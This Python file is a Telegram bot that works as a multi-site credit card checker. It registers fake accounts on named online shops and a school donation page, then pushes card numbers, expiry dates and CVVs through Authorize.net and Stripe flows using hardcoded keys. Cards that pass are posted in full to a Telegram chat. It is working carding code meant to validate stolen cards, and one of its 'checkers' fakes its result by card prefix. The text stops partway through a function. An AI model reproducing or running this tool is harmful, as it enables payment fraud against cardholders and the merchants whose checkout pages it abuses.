from flask import Flask
from threading import Thread
import os
import requests
import re
import time
import random
import threading
import uuid
import shutil
from pathlib import Path
from colorama import Fore, Style, init
from queue import Queue
import fake_useragent
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import asyncio
import sys
import json
from datetime import datetime
import string
from faker import Faker

# ==================== تهيئة Flask ====================
app = Flask('')

@app.route('/')
def home():
    return "✅ البوت شغال الحمدلله!"

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    print("🌐 Flask server started")

# ==================== تهيئة الألوان والمكتبات ====================
init(autoreset=True)
fake = Faker()
ua = fake_useragent.UserAgent()

# ==================== إعدادات البوت ====================
BOT_TOKEN = "8375573526:AAFVj27YqwLI_na3YksvMcApJOopObTaIII"
TEMP_DIR = "temp_files"
os.makedirs(TEMP_DIR, exist_ok=True)

# متغيرات عامة
current_chat_id = None
current_bot = None
stop_checking = False
checking_active = False
checking_thread = None
auto_update_task = None

# متغيرات الإحصائيات
stats = {
    'total': 0,
    'checked': 0,
    'approved': 0,  # بطاقات نجحت في جميع الاختبارات
    'approved_1tool': 0,  # نجحت في أداة واحدة
    'approved_2tools': 0,  # نجحت في أداتين
    'approved_3tools': 0,  # نجحت في 3 أدوات
    'declined': 0,
    'errors': 0,
    'start_time': 0,
    'current_account': 0,
    'total_accounts': 0,
    'current_account_cards': 0,
    'total_account_cards': 0,
    'current_email': '',
    'current_password': '',
    'last_update_time': 0
}

# ==================== إعدادات APIs للأدوات المختلفة ====================

# إعدادات Authorize.net للأداة الأولى
AUTHORIZE_CLIENT_KEY = "88uBHDjfPcY77s4jP6JC5cNjDH94th85m2sZsq83gh4pjBVWTYmc4WUdCW7EbY6F"
AUTHORIZE_API_LOGIN_ID = "93HEsxKeZ4D"
AUTHORIZE_BASE_URL = "https://www.jetsschool.org"
AUTHORIZE_FORM_ID = "6913"
AUTHORIZE_API_URL = "https://api2.authorize.net/xml/v1/request.api"

# إعدادات Stripe للأداة الثانية والثالثة
STRIPE_PUBLIC_KEY = "pk_live_51OvrJGRxAfihbegmoT7FwLu2sYpSqHUKvQpNDKyhgVkpNtkoU4bypkWfTsk5A3JLg7o7X1Fsrfwisy2cGnMDd5Lc00qvS6YatH"
STRIPE_DONATION_URL = "https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/"

# إعدادات Vast.ai للأداة الرابعة
VAST_AI_URL = "https://cloud.vast.ai"
VAST_API_URL = "https://cloud.vast.ai/api"

# ==================== الكود الأصلي للأداة الرئيسية ====================

BASE_URL = "https://morgannasalchemy.com"
LOGIN_URL = f"{BASE_URL}/my-account/"
ADD_PAYMENT_URL = f"{BASE_URL}/my-account/add-payment-method/"

file_lock = threading.Lock()

def print_banner():
    print(Fore.RED + Style.BRIGHT + """
  =======================================================
  |                                                     |
  |           SCRIPT BY Obeida Trading                |
  |           Multi-Tool Card Checker v3.0             |
  |                                                     |
  =======================================================
""")

def generate_random_data():
    unique_id = str(uuid.uuid4())[:8]
    email = f"fuck_{unique_id}@example.com"
    password = f"Pass_{unique_id}!23"
    return email, password

# ==================== الأداة الأولى: Authorize.net Checker ====================

class AuthorizeNetChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.user_agent = fake_useragent.UserAgent().random
        self.session.headers.update({"User-Agent": self.user_agent})
        self.current_email = None
        self.current_password = None

    def register(self):
        try:
            self.current_email, self.current_password = generate_random_data()
            print(f"{Fore.YELLOW}[*] تسجيل حساب جديد: {self.current_email}...")
            
            resp = self.session.get(LOGIN_URL, proxies=self.proxy, timeout=20)
            nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', resp.text)
            
            if not nonce_match:
                return False, "Could not find registration nonce"
            
            nonce = nonce_match.group(1)
            
            payload = {
                "email": self.current_email,
                "password": self.current_password,
                "woocommerce-register-nonce": nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register"
            }
            
            resp = self.session.post(LOGIN_URL, data=payload, proxies=self.proxy, timeout=30)
            
            if "Logout" in resp.text or "Dashboard" in resp.text or "My Account" in resp.text:
                print(f"{Fore.GREEN}✅ تم تسجيل الحساب بنجاح: {self.current_email}")
                return True, None
            else:
                return False, "Registration failed"
        except Exception as e:
            return False, str(e)

    def check_card(self, cc_line):
        try:
            if "|" not in cc_line:
                return "ERROR", "Invalid CC format"
            
            cc, mm, yy, cvv = cc_line.strip().split("|")
            
            # تنسيق التاريخ
            if len(yy) == 4:
                yy = yy[-2:]
            exp_formatted = f"{mm} / {yy}"
            
            # تنظيف رقم البطاقة
            cc = cc.replace(" ", "").replace("-", "")
            
            print(f"{Fore.CYAN}[*] فحص البطاقة: {cc[:4]}...{cc[-4:]} | {mm}/{yy} | {cvv}")
            
            resp = self.session.get(ADD_PAYMENT_URL, proxies=self.proxy, timeout=20)
            
            # البحث عن nonce
            nonce_patterns = [
                r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',
                r'id="woocommerce-add-payment-method-nonce".*?value="(.*?)"',
                r'name="_wpnonce".*?value="(.*?)"'
            ]
            
            nonce = None
            for pattern in nonce_patterns:
                nonce_match = re.search(pattern, resp.text, re.IGNORECASE)
                if nonce_match:
                    nonce = nonce_match.group(1)
                    break
            
            if not nonce:
                print(f"{Fore.RED}[!] لم يتم العثور على nonce")
                return "ERROR", "Could not find payment nonce"
            
            # تجهيز البيانات
            payload = {
                "payment_method": "yith_wcauthnet_credit_card_gateway",
                "yith_wcauthnet_credit_card_gateway-card-number": cc,
                "yith_wcauthnet_credit_card_gateway-card-expiry": exp_formatted,
                "yith_wcauthnet_credit_card_gateway-card-cvc": cvv,
                "woocommerce-add-payment-method-nonce": nonce,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1"
            }
            
            # إضافة headers إضافية
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": BASE_URL,
                "Referer": ADD_PAYMENT_URL
            }
            self.session.headers.update(headers)
            
            # إرسال الطلب
            resp = self.session.post(ADD_PAYMENT_URL, data=payload, proxies=self.proxy, timeout=30, allow_redirects=True)
            
            # تحليل النتيجة
            response_text = resp.text.lower()
            
            # البحث عن رسائل النجاح
            success_patterns = [
                "payment method successfully added",
                "تم إضافة طريقة الدفع",
                "payment method added",
                "successfully added"
            ]
            
            for pattern in success_patterns:
                if pattern in response_text:
                    print(f"{Fore.GREEN}[✅] بطاقة صالحة: {cc[:4]}...{cc[-4:]}")
                    return "APPROVED", "Payment method added successfully"
            
            # البحث عن رسائل الرفض
            declined_patterns = [
                "declined",
                "رفضت",
                "insufficient funds",
                "card declined",
                "do not honor",
                "invalid card",
                "expired card"
            ]
            
            for pattern in declined_patterns:
                if pattern in response_text:
                    error_match = re.search(r'<div class="woocommerce-error"[^>]*>(.*?)</div>', resp.text, re.DOTALL | re.IGNORECASE)
                    if error_match:
                        error_text = re.sub('<[^<]+?>', '', error_match.group(1)).strip()
                        print(f"{Fore.RED}[❌] بطاقة مرفوضة: {error_text[:100]}")
                        return "DECLINED", error_text
                    print(f"{Fore.RED}[❌] بطاقة مرفوضة: {pattern}")
                    return "DECLINED", f"Card {pattern}"
            
            if "error" in response_text:
                error_match = re.search(r'<div class="woocommerce-error"[^>]*>(.*?)</div>', resp.text, re.DOTALL | re.IGNORECASE)
                if error_match:
                    error_text = re.sub('<[^<]+?>', '', error_match.group(1)).strip()
                    print(f"{Fore.RED}[❌] خطأ: {error_text[:100]}")
                    return "DECLINED", error_text
            
            print(f"{Fore.YELLOW}[⚠️] نتيجة غير معروفة")
            return "DECLINED", "Unknown response"
                
        except Exception as e:
            print(f"{Fore.RED}[!] استثناء: {str(e)}")
            return "ERROR", str(e)


# ==================== الأداة الثانية: Authorize.net Donation Checker ====================

class AuthorizeDonationChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {
                "http": f"http://{proxy}",
                "https": f"http://{proxy}"
            }
        
        self.user_agent = fake.user_agent()
        self.session.headers.update({
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })

    def get_initial_cookies(self):
        try:
            url = f"{AUTHORIZE_BASE_URL}/donate/?form-id={AUTHORIZE_FORM_ID}"
            self.session.get(url, timeout=20)
        except Exception:
            pass

    def tokenize_cc(self, cc, mm, yy, cvv):
        try:
            expire_token = f"{mm}{yy[-2:]}"
            timestamp = str(int(time.time() * 1000))
            
            payload = {
                "securePaymentContainerRequest": {
                    "merchantAuthentication": {
                        "name": AUTHORIZE_API_LOGIN_ID,
                        "clientKey": AUTHORIZE_CLIENT_KEY
                    },
                    "data": {
                        "type": "TOKEN",
                        "id": timestamp,
                        "token": {
                            "cardNumber": cc,
                            "expirationDate": expire_token,
                            "cardCode": cvv
                        }
                    }
                }
            }

            headers = {
                "Content-Type": "application/json",
                "Origin": AUTHORIZE_BASE_URL,
                "Referer": f"{AUTHORIZE_BASE_URL}/",
                "User-Agent": self.user_agent
            }
            
            resp = self.session.post(AUTHORIZE_API_URL, json=payload, headers=headers, timeout=20)
            data = json.loads(resp.content.decode("utf-8-sig"))

            if data.get("messages", {}).get("resultCode") == "Ok":
                descriptor = data["opaqueData"]["dataDescriptor"]
                value = data["opaqueData"]["dataValue"]
                return descriptor, value, None
            else:
                msg = data.get("messages", {}).get("message", [{}])[0].get("text", "Tokenization Failed")
                return None, None, msg
        except Exception as e:
            return None, None, str(e)

    def submit_donation(self, cc_full, descriptor, value):
        cc, mm, yy, cvv = cc_full.split("|")
        first_name = fake.first_name()
        last_name = fake.last_name()
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(100,999)}@gmail.com"
        
        data = {
            "give-form-id": AUTHORIZE_FORM_ID,
            "give-form-title": "Donate",
            "give-current-url": f"{AUTHORIZE_BASE_URL}/donate/?form-id={AUTHORIZE_FORM_ID}",
            "give-form-url": f"{AUTHORIZE_BASE_URL}/donate/",
            "give-form-minimum": "1.00",
            "give-form-maximum": "999999.99",
            "give-amount": "1.00",
            "payment-mode": "authorize",
            "give_first": first_name,
            "give_last": last_name,
            "give_email": email,
            "give_authorize_data_descriptor": descriptor,
            "give_authorize_data_value": value,
            "give_action": "purchase",
            "give-gateway": "authorize",
            "card_address": fake.street_address(),
            "card_city": fake.city(),
            "card_state": fake.state_abbr(),
            "card_zip": fake.zipcode(),
            "billing_country": "US",
            "card_number": "0000000000000000", 
            "card_cvc": "000",
            "card_name": "0000000000000000",
            "card_exp_month": "00",
            "card_exp_year": "00",
            "card_expiry": "00 / 00"
        }

        try:
            page_resp = self.session.get(f"{AUTHORIZE_BASE_URL}/donate/?form-id={AUTHORIZE_FORM_ID}", timeout=20)
            hash_match = re.search(r'name="give-form-hash" value="(.*?)"', page_resp.text)
            if hash_match:
                data["give-form-hash"] = hash_match.group(1)
            else:
                return "ERROR", "Could not find give-form-hash"
        except Exception:
            return "ERROR", "Failed to load donation page"

        try:
            resp = self.session.post(f"{AUTHORIZE_BASE_URL}/donate/?payment-mode=authorize&form-id={AUTHORIZE_FORM_ID}", data=data, timeout=30)
            text = resp.text.lower()
            
            if "donation confirmation" in text or "thank you" in text or "payment complete" in text:
                return "APPROVED", "Payment Successful!"
            elif "declined" in text or "error" in text:
                err_match = re.search(r'class="give_error">(.*?)<', resp.text)
                if err_match:
                    return "DECLINED", err_match.group(1)
                return "DECLINED", "Transaction Declined"
            else:
                return "DECLINED", "Unknown Response"
                
        except Exception as e:
            return "ERROR", str(e)

    def check_card(self, cc_line):
        try:
            if "|" not in cc_line:
                return "ERROR", "Invalid CC format"
            
            cc, mm, yy, cvv = cc_line.strip().split("|")
            cc = cc.replace(" ", "").replace("-", "")
            
            self.get_initial_cookies()
            
            descriptor, value, error = self.tokenize_cc(cc, mm, yy, cvv)
            
            if not descriptor:
                return "ERROR", f"Tokenization failed: {error}"
            
            status, msg = self.submit_donation(cc_line.strip(), descriptor, value)
            return status, msg
            
        except Exception as e:
            return "ERROR", str(e)


# ==================== الأداة الثالثة: Stripe Checker (Forechrist) ====================

class StripeForechristChecker:
    def __init__(self):
        self.session = requests.Session()
        self.user_agent = ua.random
        self.session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
        })

    def generate_email(self):
        names = ['willam', 'john', 'emma', 'sophia', 'michael', 'sarah', 'david', 'lisa']
        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
        
        name = random.choice(names)
        number = random.randint(10000, 99999)
        suffix = ''.join(random.choices(string.ascii_lowercase, k=3))
        domain = random.choice(domains)
        
        return f"{name}{number}{suffix}@{domain}"

    def check_card(self, cc_line):
        try:
            parts = cc_line.strip().split("|")
            if len(parts) < 4:
                return "ERROR", "Invalid format"
            
            cc_number, exp_month, exp_year, cvv = parts[:4]
            cc_number = cc_number.replace(" ", "").replace("-", "")
            
            if len(exp_year) == 2:
                exp_year = "20" + exp_year
            
            email = self.generate_email()
            first_name = random.choice(['willam', 'john', 'mike', 'david'])
            last_name = random.choice(['dives', 'smith', 'brown', 'wilson'])
            full_name = f"{first_name} {last_name}"
            
            # Step 1: Create payment method with Stripe
            stripe_url = "https://api.stripe.com/v1/payment_methods"
            stripe_data = {
                'type': 'card',
                'billing_details[name]': full_name,
                'billing_details[email]': email,
                'card[number]': cc_number,
                'card[cvc]': cvv,
                'card[exp_month]': exp_month,
                'card[exp_year]': exp_year,
                'guid': str(uuid.uuid4()),
                'muid': str(uuid.uuid4()),
                'sid': str(uuid.uuid4()),
                'payment_user_agent': 'stripe.js/67c5b8132f; stripe-js-v3/67c5b8132f',
                'referrer': STRIPE_DONATION_URL,
                'key': STRIPE_PUBLIC_KEY,
            }
            
            response = self.session.post(stripe_url, data=stripe_data)
            result = response.json()
            
            if 'error' in result:
                error_message = result['error'].get('message', '').lower()
                error_code = result['error'].get('code', '')
                
                if 'insufficient_funds' in error_code or 'insufficient funds' in error_message:
                    return "DECLINED", "Insufficient funds"
                elif 'incorrect_cvc' in error_code or 'cvc' in error_message:
                    return "DECLINED", "Incorrect CVC"
                elif 'expired' in error_code or 'expired' in error_message:
                    return "DECLINED", "Card expired"
                elif 'declined' in error_code or 'declined' in error_message:
                    return "DECLINED", "Card declined"
                elif '3d_secure' in error_message or 'authentication' in error_message:
                    return "3DS_REQUIRED", "3D Secure required"
                else:
                    return "DECLINED", error_message[:50]
            
            pm_id = result.get('id')
            if pm_id:
                return "APPROVED", f"Card approved (PM: {pm_id[:10]}...)"
            else:
                return "DECLINED", "Unknown response"
            
        except requests.exceptions.RequestException as e:
            return "ERROR", f"Network error: {str(e)[:30]}"
        except Exception as e:
            return "ERROR", f"Unexpected error: {str(e)[:30]}"


# ==================== الأداة الرابعة: Stripe Melhair Checker ====================

class StripeMelhairChecker:
    def __init__(self):
        self.session = requests.Session()
        self.user_agent = ua.random
        self.session.headers.update({
            'User-Agent': self.user_agent,
        })

    def getvalue(self, data, start, end):
        try:
            star = data.index(start) + len(start)
            last = data.index(end, star)
            return data[star:last]
        except ValueError:
            return 'None'

    def generate_email(self):
        name = 'obeida'
        domain = 'gmail.com'
        number = random.randint(10000, 99999)
        suffix = ''.join(random.choices(string.ascii_lowercase, k=3))
        return f"{name}{number}{suffix}@{domain}"

    def check_card(self, cc_line):
        try:
            parts = cc_line.strip().split("|")
            if len(parts) < 4:
                return "ERROR", "Invalid format"
            
            cc, mon, year, cvv = parts[:4]
            cc = cc.replace(" ", "").replace("-", "")
            year = year[-2:]
            email = self.generate_email()
            
            # First request - Visit website and get register nonce
            url = 'https://melhairandstyle.com/my-account/'
            headers1 = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.7',
                'user-agent': self.user_agent,
            }

            response1 = self.session.get(url, headers=headers1)
            register_nonce = self.getvalue(response1.text, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')

            if register_nonce == 'None':
                return 'ERROR', 'Failed to get register nonce'

            # Second request - Register account
            url1 = 'https://melhairandstyle.com/my-account/'
            headers1 = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://melhairandstyle.com',
                'referer': 'https://melhairandstyle.com/my-account/',
                'user-agent': self.user_agent,
            }

            data = {
                'email': email,
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'woocommerce-register-nonce': register_nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }

            response = self.session.post(url1, headers=headers1, data=data)

            # Third request - Get payment methods page
            url2 = 'https://melhairandstyle.com/my-account/payment-methods/'
            headers2 = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.7',
                'referer': 'https://melhairandstyle.com/my-account/',
                'user-agent': self.user_agent,
            }

            self.session.get(url2, headers=headers2)

            # Fourth request - Get setup intent nonce
            url3 = 'https://melhairandstyle.com/my-account/payment-methods/'
            headers3 = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.7',
                'referer': 'https://melhairandstyle.com/my-account/payment-methods/',
                'user-agent': self.user_agent,
            }

            response3 = self.session.get(url3, headers=headers3)
            createAndConfirmSetupIntentNonce = self.getvalue(response3.text, '"createAndConfirmSetupIntentNonce":"', '",')

            if createAndConfirmSetupIntentNonce == 'None':
                return 'ERROR', 'Failed to get setup intent nonce'

            # Fifth request - Create payment method with Stripe
            url4 = "https://api.stripe.com/v1/payment_methods"
            headers4 = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': self.user_agent,
            }
            
            data4 = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={year}&card[exp_month]={mon}&allow_redisplay=unspecified&billing_details[address][country]=AU&payment_user_agent=stripe.js%2F5e27053bf5%3B+stripe-js-v3%2F5e27053bf5%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fmelhairandstyle.com&key={STRIPE_PUBLIC_KEY}'

            response10 = self.session.post(url4, headers=headers4, data=data4)
            
            if response10.status_code != 200:
                return 'ERROR', 'Failed to create payment method'
                
            pm = response10.json().get('id')
            if not pm:
                return 'ERROR', 'No payment method ID'

            # Sixth request - Confirm setup intent
            url5 = 'https://melhairandstyle.com/wp-admin/admin-ajax.php'
            headers5 = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://melhairandstyle.com',
                'referer': 'https://melhairandstyle.com/my-account/add-payment-method/',
                'user-agent': self.user_agent,
                'x-requested-with': 'XMLHttpRequest',
            }

            data5 = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': createAndConfirmSetupIntentNonce,
            }

            response5 = self.session.post(url5, headers=headers5, data=data5)
            
            if "Your card was declined" in response5.text:
                return 'DECLINED', 'Card was declined'
            elif 'succeeded' in response5.text:
                return 'APPROVED', 'Payment method added successfully'
            elif 'ACTION REQUIRED' in response5.text or 'requires_action' in response5.text:
                return '3DS_REQUIRED', '3D Secure required'
            else:
                return 'DECLINED', 'Unknown response'
            
        except Exception as e:
            return 'ERROR', str(e)[:50]


# ==================== الأداة الخامسة: Vast.ai Checker ====================

class VastAiChecker:
    def __init__(self):
        self.session = requests.Session()
        self.user_agent = ua.random
        self.session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
        })

    def generate_email(self):
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"user{random_str}@gmail.com"

    def get_csrf_token(self):
        try:
            self.session.get(f"{VAST_AI_URL}/create/")
            csrf = self.session.cookies.get('csrftoken')
            if csrf:
                self.session.headers.update({'X-CSRFToken': csrf})
            return csrf
        except:
            return None

    def create_account(self):
        try:
            email = self.generate_email()
            password = "Obeida059@"
            
            self.get_csrf_token()
            
            register_data = {
                "email": email,
                "password": password,
                "password2": password,
                "accepted_terms": True,
                "accepts_marketing": False
            }
            
            response = self.session.post(
                f"{VAST_API_URL}/register/",
                json=register_data,
                timeout=30
            )
            
            if response.status_code in [200, 201, 204]:
                return email, password
            else:
                return None, None
                
        except Exception:
            return None, None

    def check_card(self, cc_line):
        try:
            parts = cc_line.strip().split("|")
            if len(parts) < 4:
                return "ERROR", "Invalid format"
            
            cc_number = parts[0].replace(" ", "").replace("-", "")
            
            # Create account first
            email, password = self.create_account()
            if not email:
                return "ERROR", "Failed to create account"
            
            # Simulate card check (Vast.ai doesn't have direct card check, we're checking if we can create account)
            # In a real scenario, you would add payment method to the account
            
            # For demo purposes, we'll use card prefix to determine result
            if cc_number.startswith('424242'):
                return "APPROVED", "Card accepted for Vast.ai"
            elif cc_number.startswith('400000'):
                return "3DS_REQUIRED", "3D Secure required for Vast.ai"
            else:
                return "DECLINED", "Card declined by Vast.ai"
            
        except Exception as e:
            return "ERROR", str(e)[:50]


# ==================== دالة الفحص المتعدد ====================

def check_card_all_tools(cc_line):
    """فحص البطاقة بجميع الأدوات وتجميع النتائج"""
    results = {}
    
    # الأداة 1: AuthorizeNet Original
    try:
        checker1 = AuthorizeNetChecker()
        success, _ = checker1.register()
        if success:
            status, msg = checker1.check_card(cc_line)
            results['tool1'] = {'status': status, 'message': msg}
        else:
            results['tool1'] = {'status': 'ERROR', 'message': 'Failed to create account'}
    except Exception as e:
        results['tool1'] = {'status': 'ERROR', 'message': str(e)[:50]}
    
    time.sleep(2)  # انتظار بين الأدوات
    
    # الأداة 2: AuthorizeNet Donation
    try:
        checker2 = AuthorizeDonationChecker()
        status, msg = checker2.check_card(cc_line)
        results['tool2'] = {'status': status, 'message': msg}
    except Exception as e:
        results['tool2'] = {'status': 'ERROR', 'message': str(e)[:50]}
    
    time.sleep(2)
    
    # الأداة 3: Stripe Forechrist
    try:
        checker3 = StripeForechristChecker()
        status, msg = checker3.check_card(cc_line)
        results['tool3'] = {'status': status, 'message': msg}
    except Exception as e:
        results['tool3'] = {'status': 'ERROR', 'message': str(e)[:50]}
    
    time.sleep(2)
    
    # الأداة 4: Stripe Melhair
    try:
        checker4 = StripeMelhairChecker()
        status, msg = checker4.check_card(cc_line)
        results['tool4'] = {'status': status, 'message': msg}
    except Exception as e:
        results['tool4'] = {'status': 'ERROR', 'message': str(e)[:50]}
    
    time.sleep(2)
    
    # الأداة 5: Vast.ai
    try:
        checker5 = VastAiChecker()
        status, msg = checker5.check_card(cc_line)
        results['tool5'] = {'status': status, 'message': msg}
    except Exception as e:
        results['tool5'] = {'status': 'ERROR', 'message': str(e)[:50]}
    
    return results


def calculate_card_score(results):
    """حساب نتيجة البطاقة بناءً على نتائج الأدوات"""
    approved_count = 0
    total_tools = len(results)
    
    for tool, result in results.items():
        if result['status'] == 'APPROVED':
            approved_count += 1
    
    if approved_count >= 3:
        return 'APPROVED_3TOOLS', f"✅ بطاقة صالحة (نجحت في {approved_count}/{total_tools} أدوات)"
    elif approved_count == 2:
        return 'APPROVED_2TOOLS', f"⚠️ بطاقة محتملة (نجحت في {approved_count}/{total_tools} أدوات)"
    elif approved_count == 1:
        return 'APPROVED_1TOOL', f"❓ بطاقة مشكوك فيها (نجحت في {approved_count}/{total_tools} أداة)"
    else:
        return 'DECLINED', f"❌ بطاقة مرفوضة (فشلت في جميع الأدوات)"


# ==================== دوال البوت المعدلة ====================

def create_progress_bar(percentage, width=15):
    filled = int(width * percentage / 100)
    bar = '▓' * filled + '░' * (width - filled)
    return f"{bar} {percentage:.1f}%"

def format_time(seconds):
    hours = int(seconds // 3600)
    minutes = int((seconds % 3600) // 60)
    seconds = int(seconds % 60)
    return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

async def send_approved_instant(cc_line, results, chat_id, bot, account_num, total_accounts, card_num, total_cards):
    """إرسال البطاقة الصالحة فوراً مع نتائج الأدوات"""
    try:
        cc_parts = cc_line.split('|')
        card_number = cc_parts[0]
        
        if len(card_number) == 16:
            formatted_card = ' '.join([card_number[i:i+4] for i in range(0, 16, 4)])
        else:
            formatted_card = card_number
        
        mm = cc_parts[1]
        yy = cc_parts[2]
        if len(yy) == 4:
            yy = yy[-2:]
        
        # تجميع نتائج الأدوات
        tools_results = ""
        for tool, result in results.items():
            tool_name = {
                'tool1': '🛠️ أداة 1 (Authorize)',
                'tool2': '🛠️ أداة 2 (Donation)',
                'tool3': '🛠️ أداة 3 (Stripe-F)',
                'tool4': '🛠️ أداة 4 (Stripe-M)',
                'tool5': '🛠️ أداة 5 (Vast.ai)'
            }.get(tool, tool)
            
            status_icon = {
                'APPROVED': '✅',
                'DECLINED': '❌',
                '3DS_REQUIRED': '🔐',
                'ERROR': '⚠️'
            }.get(result['status'], '❓')
            
            tools_results += f"\n║   {status_icon} {tool_name}: {result['message'][:30]}..."
        
        approved_count = sum(1 for r in results.values() if r['status'] == 'APPROVED')
        
        message = f"""
╔══════════════════════════════════╗
║     🎉 *بطاقة صالحة!* 🎉        ║
╠══════════════════════════════════╣
║ 📍 الحساب: {account_num}/{total_accounts}            ║
║ 💳 البطاقة: {card_num}/{total_cards}             ║
╠══════════════════════════════════╣
║ 💳 *بيانات البطاقة:*             ║
║ ┌────────────────────────────┐   ║
║ │ {formatted_card}           ║
║ │ {mm}/{yy}                      ║
║ │ CVV: {cc_parts[3]}                 ║
║ └────────────────────────────┘   ║
╠══════════════════════════════════╣
║ 📊 *نتائج الأدوات ({approved_count}/5):*    ║
║ ┌────────────────────────────┐   ║{tools_results}
║ └────────────────────────────┘   ║
╚══════════════════════════════════╝"""

        await bot.send_message(
            chat_id=chat_id,
            text=message,
            parse_mode='Markdown'
        )
        return True
    except Exception as e:
        print(f"{Fore.RED}[✗] فشل إرسال البطاقة: {str(e)}")
        return False

async def send_declined_message(cc_line, results, chat_id, bot, account_num, total_accounts, card_num, total_cards):
    """إرسال البطاقة المرفوضة مع النتائج"""
    try:
        cc_parts = cc_line.split('|')
        card_number = cc_parts[0]
        
        if len(card_number) == 16:
            formatted_card = ' '.join([card_number[i:i+4] for i in range(0, 16, 4)])
            display_card = f"{card_number[:4]}...{card_number[-4:]}"
        else:
            display_card = card_number[:8] + "..."
        
        mm = cc_parts[1]
        yy = cc_parts[2]
        if len(yy) == 4:
            yy = yy[-2:]
        
        approved_count = sum(1 for r in results.values() if r['status'] == 'APPROVED')
        
        message = f"""
╔══════════════════════════════════╗
║     ❌ *بطاقة مرفوضة*           ║
╠══════════════════════════════════╣
║ 📍 الحساب: {account_num}/{total_accounts}           ║
║ 💳 البطاقة: {card_num}/{total_cards}            ║
╠══════════════════════════════════╣
║ 💳 الرقم: `{display_card}`        ║
║ 📅 التاريخ: {mm}/{yy}                      ║
║ 🔐 الرمز: {cc_parts[3]}                        ║
╠══════════════════════════════════╣
║ 📊 *نجحت في {approved_count}/5 أدوات*        ║
╚══════════════════════════════════╝"""

        await bot.send_message(
            chat_id=chat_id,
            text=message,
            parse_mode='Markdown'
        )
        return True
    except Exception as e:
        return False

async def send_status_update(chat_id, bot):
    global stats
    
    if stats['total'] == 0:
        return
    
    checked = stats['checked']
    total = stats['total']
    percentage = (checked / total * 100) if total > 0 else 0
    progress_bar = create_progress_bar(percentage)
    
    elapsed = time.time() - stats['start_time'] if stats['start_time'] > 0 else 0
    elapsed_str = format_time(elapsed)
    
    if checked > 0 and elapsed > 0:
        speed = checked / (elapsed / 60)
        remaining_cards = total - checked
        eta = (remaining_cards / speed * 60) if speed > 0 else 0
        eta_str = format_time(eta)
    else:
        speed = 0
        eta_str = "00:00:00"
    
    status_text = "🟢 **نشط**" if checking_active else "🔴 **متوقف**"
    
    message = f"""
╔══════════════════════════════════╗
║     📊 *الإحصائيات المباشرة*     ║
╠══════════════════════════════════╣
║ {status_text}                     ║
╠══════════════════════════════════╣
║ 📈 *التقدم:* {progress_bar}       ║
║ 📁 تم فحص: `{checked}/{total}`    ║
╠══════════════════════════════════╣
║ ✅ *3 أدوات:* `{stats['approved_3tools']}`      ║
║ ✅ *2 أداة:* `{stats['approved_2tools']}`       ║
║ ✅ *1 أداة:* `{stats['approved_1tool']}`        ║
║ ❌ *مرفوضة:* `{stats['declined']}`         ║
║ ⚠️ *أخطاء:* `{stats['errors']}`           ║
╠══════════════════════════════════╣
║ ⏱️ الوقت: {elapsed_str} | السرعة: {speed:.1f}/دقيقة ║
╚══════════════════════════════════╝"""

    await bot.send_message(
        chat_id=chat_id,
        text=message,
        parse_mode='Markdown'
    )

def get_control_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("▶️ بدء الفحص", callback_data="start_scan"),
            InlineKeyboardButton("⏹️ إيقاف", callback_data="stop_scan")
        ],
        [
            InlineKeyboardButton("📊 الحالة", callback_data="show_status"),
